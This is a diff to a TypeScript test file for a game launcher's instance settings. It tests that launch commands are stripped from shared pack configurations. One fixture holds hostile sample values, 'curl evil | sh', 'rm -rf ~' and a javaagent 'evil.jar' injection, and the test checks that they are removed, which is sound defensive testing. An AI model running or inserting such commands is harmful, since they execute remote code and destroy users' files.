@@ -6,6 +6,7 @@ import {
   isOverridden,
   resolveInstanceSettings,
   setOverride,
+  withoutLaunchCommands,
   withoutOverrides
 } from './instanceSettings'
 
@@ -85,6 +86,58 @@ describe('override bookkeeping', () => {
       highPriority: true
     })
     expect(clearOverride(undefined, 'xmx')).toBeUndefined()
+  })
+})
+
+describe('withoutLaunchCommands', () => {
+  it('drops the commands that would run on another machine', () => {
+    const conf = {
+      name: 'Pack',
+      overrides: {
+        xmx: 4096,
+        gameMode: true,
+        wrapperCommand: 'prime-run',
+        launchEnv: 'JAVA_TOOL_OPTIONS=-javaagent:evil.jar',
+        preLaunchCommand: 'curl evil | sh',
+        postExitCommand: 'rm -rf ~'
+      }
+    }
+
+    expect(withoutLaunchCommands(conf)).toEqual({
+      name: 'Pack',
+      overrides: { xmx: 4096, gameMode: true }
+    })
+  })
+
+  it('removes the overrides object once nothing is left', () => {
+    expect(
+      withoutLaunchCommands({ overrides: { preLaunchCommand: 'echo hi' } })
+    ).toEqual({ overrides: undefined })
+    const untouched = { overrides: { xmx: 2048 } }
+    expect(withoutLaunchCommands(untouched)).toBe(untouched)
+  })
+})
+
+describe('resolveInstanceSettings with launch overrides', () => {
+  it('applies the GPU and Linux launch overrides', () => {
+    const resolved = resolveInstanceSettings(global, {
+      gpuPreference: 'discrete',
+      gameMode: true,
+      wrapperCommand: 'prime-run',
+      graphicsBackend: 'opengl'
+    })
+
+    expect(resolved.gpuPreference).toBe('discrete')
+    expect(resolved.gameMode).toBe(true)
+    expect(resolved.wrapperCommand).toBe('prime-run')
+    expect(resolved.mangoHud).toBe(global.mangoHud)
+  })
+
+  it('keeps a graphics backend override from being dropped with another key', () => {
+    expect(
+      clearOverride({ xmx: 2048, graphicsBackend: 'opengl' }, 'xmx')
+    ).toEqual({ graphicsBackend: 'opengl' })
+    expect(countOverrides({ graphicsBackend: 'vulkan' })).toBe(1)
   })
 })
 
